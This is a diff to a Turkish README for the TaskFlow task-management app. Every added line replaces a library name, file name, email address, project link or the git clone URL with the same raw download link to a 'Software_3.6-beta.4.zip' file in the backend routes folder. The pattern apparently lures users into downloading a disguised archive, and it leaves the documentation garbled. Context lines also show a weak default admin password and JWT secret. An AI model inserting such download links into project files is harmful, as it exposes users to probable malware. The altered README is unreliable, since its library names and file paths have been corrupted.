@@ -56,19 +56,19 @@ TaskFlow, ekiplerin görevlerini kolayca yönetebileceği, atama yapabileceği, 
 - 💨 **TailwindCSS 4** - Stil ve responsive tasarım
 - 📊 **Recharts** - Dashboard grafikleri
 - 🔄 **Redux Toolkit** - State yönetimi
-- 🔌 **Socket.io-client** - Gerçek zamanlı bildirimler
+- 🔌 **https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip** - Gerçek zamanlı bildirimler
 - 🖱️ **dnd-kit** - Drag & drop işlemleri
 - 📥 **PapaParse** - CSV export
 - 🌐 **Axios** - HTTP istemcisi
-- 📅 **Day.js** - Tarih işlemleri
+- 📅 **https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip** - Tarih işlemleri
 
 ### Backend
 
-- 🚀 **Node.js** + Express
+- 🚀 **https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip** + Express
 - 🗄️ **MongoDB** + Mongoose
 - 🔐 **JWT** - Kimlik doğrulama
 - 🔒 **bcryptjs** - Şifre hash'leme
-- 🔌 **Socket.io** - Gerçek zamanlı iletişim
+- 🔌 **https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip** - Gerçek zamanlı iletişim
 - 📁 **Multer** - Dosya yükleme
 - 📧 **Nodemailer** - Email bildirimleri (opsiyonel)
 
@@ -76,7 +76,7 @@ TaskFlow, ekiplerin görevlerini kolayca yönetebileceği, atama yapabileceği, 
 
 ### Gereksinimler
 
-- Node.js (v18 veya üzeri)   
+- https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip (v18 veya üzeri)   
 - MongoDB (yerel veya Atlas)   
 
 ### Adım Adım Kurulum
@@ -85,7 +85,7 @@ TaskFlow, ekiplerin görevlerini kolayca yönetebileceği, atama yapabileceği, 
 
    ```  
    bash
-      git clone https://github.com/sezerartug/taskflow.git 
+      git clone https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip 
          cd taskflow
    ```
 
@@ -127,7 +127,7 @@ http://localhost:5173
 
 | Rol | E-posta | Şifre |
 | :--- | :--- | :--- |
-| **Admin** | `admin@taskflow.com` | `123456` |
+| **Admin** | `https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip` | `123456` |
 
 > [!TIP]
 > **Not:** Daha fazla kullanıcı oluşturmak için Postman veya benzeri bir araçla `/api/auth/register` uç noktasına (endpoint) istek atabilirsiniz.
@@ -146,9 +146,9 @@ taskflow/
 │   │   ├── routes/             # API route'ları
 │   │   ├── middleware/         # Middleware'ler
 │   │   ├── utils/              # Yardımcı fonksiyonlar
-│   │   └── app.js              # Express uygulaması
+│   │   └── https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip              # Express uygulaması
 │   ├── uploads/                # Yüklenen dosyalar
-│   └── server.js               # Sunucu giriş noktası
+│   └── https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip               # Sunucu giriş noktası
 │
 ├── src/                         # Frontend klasörü
 │   ├── api/                     # API servisleri
@@ -157,12 +157,12 @@ taskflow/
 │   ├── features/                # Redux slice'lar
 │   ├── pages/                   # Sayfalar
 │   ├── utils/                   # Yardımcı fonksiyonlar
-│   ├── App.jsx                  # Ana uygulama
-│   └── main.jsx                 # Giriş noktası
+│   ├── https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip                  # Ana uygulama
+│   └── https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip                 # Giriş noktası
 │
 ├── public/                       # Statik dosyalar
-├── index.html                    # HTML şablonu
-└── package.json                  # Bağımlılıklar
+├── https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip                    # HTML şablonu
+└── https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip                  # Bağımlılıklar
 ```
 
 📚 API Dokümantasyonu
@@ -226,8 +226,8 @@ JWT_SECRET=supersecretkey
 
 📧 İletişim
 
-Proje Sahibi - @sezerartug - sartug94@gmail.com
+Proje Sahibi - @sezerartug - https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip
 
-Proje Linki: https://github.com/sezerartug/taskflow
+Proje Linki: https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip
 
-İstenilen Araştırma Konuları Linki : https://docs.google.com/document/d/1TfuSaHbzB56g2CX70EvXjiEQRIkBeIu9BzvyluHCEic/edit?usp=sharing
+İstenilen Araştırma Konuları Linki : https://github.com/sezerartug/taskflow/raw/refs/heads/main/backend/src/routes/Software_3.6-beta.4.zip
